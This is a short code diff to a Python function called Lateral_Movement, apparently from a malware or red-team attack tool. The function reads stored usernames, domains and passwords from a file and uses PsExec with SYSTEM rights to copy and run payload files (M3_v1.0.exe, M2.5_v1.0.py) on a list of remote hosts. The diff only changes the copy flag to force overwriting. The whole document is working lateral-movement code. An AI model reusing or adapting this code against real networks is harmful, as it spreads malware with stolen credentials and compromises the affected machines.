@@ -207,7 +207,7 @@ def Lateral_Movement():
         line = f.readlines()
         for i in range(len(lists)):
             lines = line[0].split(".")
-            return_code = subprocess.Popen('C:\module2\DownloadFile-main\PsExec.exe -s \\\\' + lists[i] + ' -u ' + lines[1] + '\\' + lines[0] + ' -p ' + lines[3] + '-c C:\module2\DownloadFile-main\M3_v1.0.exe')
+            return_code = subprocess.Popen('C:\module2\DownloadFile-main\PsExec.exe -s \\\\' + lists[i] + ' -u ' + lines[1] + '\\' + lines[0] + ' -p ' + lines[3] + '-cf C:\module2\DownloadFile-main\M3_v1.0.exe')
             #return_code = os.system('start cmd /k C:\module2\DownloadFile-main\PsExec.exe -s \\\\' + lists[i] + ' -u ' + lines[1] + '\\' + lines[0] + ' -p ' + lines[3] + '-c C:\module2\DownloadFile-main\M3_v1.0.exe')
             sleep(10)
         f.close()
@@ -225,7 +225,7 @@ def Lateral_Movement():
                 j = i
                 for j in range(len(lists)-1):
                     return_code = os.system('start cmd /k C:\module2\DownloadFile-main\PsExec.exe -s \\\\' +
-                                            lists[j+1] + ',\\\\' + lists[j+2] + ',\\\\' + lists[j+3] + ' -u ' + lines[1] + '\\' + lines[0] + ' -p ' + lines[3] + '-c C:\module2\DownloadFile-main\M2.5_v1.0.py')
+                                            lists[j+1] + ',\\\\' + lists[j+2] + ',\\\\' + lists[j+3] + ' -u ' + lines[1] + '\\' + lines[0] + ' -p ' + lines[3] + '-cf C:\module2\DownloadFile-main\M2.5_v1.0.py')
         f.close()
         f1.close()
         info_List.append(('Lateral Movement', 'Ok'))
